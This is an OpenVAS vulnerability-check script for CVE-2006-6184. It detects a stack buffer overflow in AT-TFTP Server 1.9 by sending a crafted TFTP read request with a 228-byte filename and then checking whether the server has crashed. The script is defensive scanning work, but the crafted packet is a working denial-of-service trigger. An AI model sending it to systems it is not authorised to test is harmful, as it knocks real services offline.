###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_at_tftp_filename_bof_vuln.nasl 13203 2019-01-21 15:28:12Z cfischer $
#
# AT-TFTP Server Long Filename BoF Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802065");
  script_version("$Revision: 13203 $");
  script_bugtraq_id(21320);
  script_cve_id("CVE-2006-6184");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:28:12 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2013-11-26 11:32:51 +0530 (Tue, 26 Nov 2013)");
  script_name("AT-TFTP Server Long Filename BoF Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://secunia.com/advisories/23106");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/30539");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16350");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/attftp-adv.txt");

  script_tag(name:"summary", value:"This host is running AT-TFTP Server and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted tftp request and check is it vulnerable to BoF or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"The falw is caused due to a boundary error during the processing of TFTP
  Read/Write request packet types. This can be exploited to cause a stack-based buffer overflow by sending a
  specially crafted packet with an overly long filename.");

  script_tag(name:"affected", value:"Allied Telesyn TFTP Server (AT-TFTP) version 1.9 and possibly earlier.");

  script_tag(name:"impact", value:"Successfully exploiting these issues may allow an attacker to execute
  arbitrary code with the privileges of the user running the affected application.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("tftp.inc");

tftp_port = get_kb_item("Services/udp/tftp");
if(!tftp_port)
  tftp_port = 69;

if(!get_udp_port_state(tftp_port))
  exit(0);

if(!tftp_alive(port:tftp_port))
  exit(0);

soc = open_sock_udp(tftp_port);
if(!soc)
  exit(0);

long_file_name = raw_string(crap(data:raw_string(0x41), length: 228));

crafted_tftp_pkt = raw_string(0x00, 0x01, long_file_name, 0x00, 0x6e, 0x65,
                    0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);
send(socket:soc, data:crafted_tftp_pkt);
close(soc);

if(!tftp_alive(port:tftp_port)){
  security_message(port:tftp_port, proto:"udp");
  exit(0);
}

exit(99);